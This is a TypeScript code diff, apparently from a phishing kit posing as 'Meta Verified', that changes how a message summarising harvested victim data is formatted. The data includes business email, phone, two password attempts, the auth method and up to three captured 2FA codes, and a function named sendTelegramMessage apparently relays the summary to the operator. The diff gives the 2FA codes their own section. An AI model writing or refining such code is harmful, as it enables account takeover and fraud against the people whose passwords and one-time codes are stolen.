@@ -159,8 +159,9 @@ function formatMessage(data: any): string {
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
         : '-';
     const authLine = d.authMethod ? `\n<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
+    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
 
-    return [
+    const lines = [
         `<b>📋 META VERIFIED - CASE SUMMARY</b>`,
         `--------------`,
         `<b>🖥️ SYSTEM</b>`,
@@ -177,14 +178,23 @@ function formatMessage(data: any): string {
         `<b>Business Email:</b> <code>${escapeHtml(d.emailBusiness || '-')}</code>`,
         `<b>Phone:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : '-'}</code>`,
         `--------------`,
-        `<b>🔐 SECURITY</b>`,
+        `<b>🔑 PASSWORD</b>`,
         `<b>Password(1):</b> <code>${escapeHtml(d.password || '-')}</code>`,
         `<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond || '-')}</code>`,
-        `${authLine ? authLine.trim() : ''}`,
-        `<b>2FA(1):</b> <code>${escapeHtml(d.twoFa || '-')}</code>`,
-        `<b>2FA(2):</b> <code>${escapeHtml(d.twoFaSecond || '-')}</code>`,
-        `<b>2FA(3):</b> <code>${escapeHtml(d.twoFaThird || '-')}</code>`
-    ].filter(Boolean).join('\n');
+        `${authLine ? authLine.trim() : ''}`
+    ].filter(Boolean);
+
+    if (has2FA) {
+        lines.push(
+            `--------------`,
+            `<b>🔐 2FA</b>`,
+            `<b>2FA(1):</b> <code>${escapeHtml(d.twoFa || '-')}</code>`,
+            `<b>2FA(2):</b> <code>${escapeHtml(d.twoFaSecond || '-')}</code>`,
+            `<b>2FA(3):</b> <code>${escapeHtml(d.twoFaThird || '-')}</code>`
+        );
+    }
+
+    return lines.join('\n');
 }
 
 export async function sendTelegramMessage(data: any): Promise<void> {
